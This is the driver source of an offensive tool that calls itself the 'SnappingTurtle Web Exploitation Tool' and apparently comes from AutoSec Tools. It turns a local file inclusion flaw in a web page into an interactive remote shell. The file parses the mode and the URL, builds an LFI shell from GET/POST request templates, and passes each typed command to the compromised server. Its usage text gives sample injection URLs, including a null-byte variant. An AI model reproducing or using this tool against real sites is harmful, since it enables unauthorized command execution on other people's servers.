class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

if (hasArgs) {
    shell = null;
    switch (args.Mode) {
        ClassOption.Lfi: {
            print('Exploiting LFI');
            tmpl = HttpRequestTemplate(args.Url, args.Get, args.Post);
            shell = LfiShell(tmpl);
            
            if (!shell.create()) {
                print('Failed to create shell, exiting');
                quit();
            }
        }
        
        default: {
            print('Invalid mode: %s' % args.Mode);
            quit();
        }
    }

    shellLoop(shell);
} else {
    print('SnappingTurtle Web Exploitation Tool 0.1.' + __BUILD__);
    print('AutoSec Tools - http://autosectools.com/\r\n');
    print('python st.py [mode (required)] [url(required)] [options]\r\n');
    print('# Modes\r\n');
    print('  -lfi\r\n');
    print('  Local file inclusion. Injection is performed using the $lfi token in GET or POST data.\r\n');
    print('# Url\r\n');
    print('  Url template. Use %s to inject.\r\n');
    print('# Options\r\n');
    print('  --g {GET name} {GET value}     GET data in key/value format.');
    print('  --p {POST name} {POST value}   POST data in key/value format.');
    print('  -g {GET data}                  GET data in Python map format.');
    print('  -p {POST data}                 POST data in Python map format.');
    print('');
    print('# Examples\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=$lfi\r\n');
    print('  python st.py -lfi http://localhost/test.php?theme=$lfi%00\r\n');
    print('  python st.py -lfi http://localhost/postTest.php -p "{\'theme\':\'$lfi\'}"\r\n');
}
